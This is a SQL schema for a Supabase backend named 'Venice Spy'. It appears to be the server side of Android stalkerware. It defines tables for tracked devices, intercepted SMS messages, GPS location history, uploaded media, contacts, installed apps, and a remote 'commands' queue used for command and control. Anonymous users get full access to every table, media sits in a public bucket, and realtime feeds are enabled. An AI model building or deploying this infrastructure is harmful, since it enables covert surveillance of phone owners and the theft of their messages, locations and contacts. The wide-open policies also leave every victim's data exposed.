-- Venice Spy — Supabase schema
create extension if not exists pgcrypto;

create table if not exists devices (
  id text primary key, name text, model text, brand text, android text,
  phone text, battery int, owner_number text,
  lat double precision, lng double precision,
  last_seen timestamptz default now(), created_at timestamptz default now()
);

create table if not exists sms (
  key text primary key,
  device_id text references devices(id) on delete cascade,
  address text, body text, direction text default 'in',
  ts timestamptz, created_at timestamptz default now()
);
create index if not exists sms_dev_ts on sms(device_id, ts desc);

create table if not exists locations (
  id bigserial primary key,
  device_id text references devices(id) on delete cascade,
  lat double precision, lng double precision, accuracy double precision,
  ts timestamptz default now()
);
create index if not exists loc_dev_ts on locations(device_id, ts desc);

create table if not exists media (
  id bigserial primary key,
  device_id text references devices(id) on delete cascade,
  kind text, url text, size bigint, ts timestamptz default now()
);
create index if not exists media_dev_ts on media(device_id, ts desc);

create table if not exists contacts (
  key text primary key,
  device_id text references devices(id) on delete cascade,
  name text, phone text
);

create table if not exists apps (
  key text primary key,
  device_id text references devices(id) on delete cascade,
  label text, package text, version text, system boolean
);

create table if not exists commands (
  id bigserial primary key,
  device_id text references devices(id) on delete cascade,
  cmd text, params jsonb default '{}'::jsonb,
  status text default 'pending', result text,
  created_at timestamptz default now(), done_at timestamptz
);
create index if not exists cmd_pending on commands(device_id, status);

create table if not exists events (
  id bigserial primary key,
  device_id text, kind text, message text,
  created_at timestamptz default now()
);

do $$
declare t text;
begin
  foreach t in array array['devices','sms','locations','media','contacts','apps','commands','events']::text[] loop
    execute format('alter table %I enable row level security', t);
    begin
      execute format('create policy p_%s on %I for all to anon using (true) with check (true)', t, t);
    exception when duplicate_object then null;
    end;
  end loop;
end $$;

insert into storage.buckets (id, name, public) values ('media','media', true)
on conflict (id) do nothing;

do $$ begin
  begin
    execute 'create policy p_media_obj on storage.objects for all to anon using (bucket_id = ''media'') with check (bucket_id = ''media'')';
  exception when duplicate_object then null;
  end;
end $$;

do $$
declare t text;
begin
  foreach t in array array['devices','sms','locations','media','commands']::text[] loop
    begin execute format('alter publication supabase_realtime add table %I', t);
    exception when others then null; end;
  end loop;
end $$;